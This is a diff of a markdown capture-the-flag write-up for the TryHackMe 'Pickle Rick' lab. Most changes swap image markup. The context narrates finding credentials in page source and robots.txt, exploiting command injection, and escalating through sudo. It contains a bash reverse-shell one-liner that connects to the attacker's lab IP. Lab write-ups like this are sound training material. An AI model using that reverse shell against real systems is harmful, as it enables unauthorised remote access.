@@ -1,9 +1,7 @@
 # TryHackMe Pickle Rick
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick1.webp" alt="mannaully
-" width="600">
-</div>
+![Open Lightbox](../assets/PickleRick1.webp){ .glightbox .center width="600" }
+
 ```
 TryhackMe Machine:- Pickel Rick
 Machine Info:- Web
@@ -29,43 +27,28 @@ Now ssh(22) and http(80) is open now i also perfromed directory brute force and 
 
 Now /assets, /robots.txt and login.php and login.php are 200 ok so i visited them one by one first the main page.
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick2.webp" alt="mannaully
-" width="550">
-</div>
+![Open Lightbox](../assets/PickleRick2.webp){ .glightbox .center width="500" }
+
 Now on the i looked at the page source and found the username.
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick3.webp" alt="mannaully
-" width="550">
-</div>
+![Open Lightbox](../assets/PickleRick3.webp){ .glightbox .center width="500" }
+
 And on the assets i didnt find anything significant i visted the robots.txt and found the password for the username.
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick4.webp" alt="mannaully
-" width="550">
-</div>
+![Open Lightbox](../assets/PickleRick4.webp){ .glightbox .center width="500" }
 
 Now on logged in using the username and the password i got on /login.php
 
 And after login found command panel i tested it and a possible command injection.
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick5.webp" alt="mannaully
-" width="550">
-</div>
+![Open Lightbox](../assets/PickleRick5.webp){ .glightbox .center width="500" }
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick6.webp" alt="mannaully
-" width="550">
-</div>
+
+![Open Lightbox](../assets/PickleRick6.webp){ .glightbox .center width="500" }
 
 And yes it worked but it also disabled the commands.
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick7.webp" alt="mannaully
-" width="550">
-</div>
+![Open Lightbox](../assets/PickleRick7.webp){ .glightbox .center width="500" }
 
 So lets try to get a shell on this im using.
 
@@ -75,31 +58,19 @@ bash -c 'bash -i >& /dev/tcp/10.8.197.78/8081 0>&1'
 
 And get your listener ready it pop a shell.
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick8.webp" alt="mannaully
-" width="550">
-</div>
+![Open Lightbox](../assets/PickleRick8.webp){ .glightbox .center width="500" }
 
 Got the first ingredient.
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick9.webp" alt="mannaully
-" width="550">
-</div>
+![Open Lightbox](../assets/PickleRick9.webp){ .glightbox .center width="500" }
 
 Now looked around and in /home/rick found the second file.
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick10.webp" alt="mannaully
-" width="550">
-</div>
+![Open Lightbox](../assets/PickleRick10.webp){ .glightbox .center width="500" }
 
 Now the to escalate privilege i found that the user www/data can exeute any sudo commands.
 
-<div style="text-align: center;">
-  <img src="/assets/PickleRick11.webp" alt="mannaully
-" width="550">
-</div>
+![Open Lightbox](../assets/PickleRick11.webp){ .glightbox .center width="500" }
 
 And found the 3rd ingredient too.
 
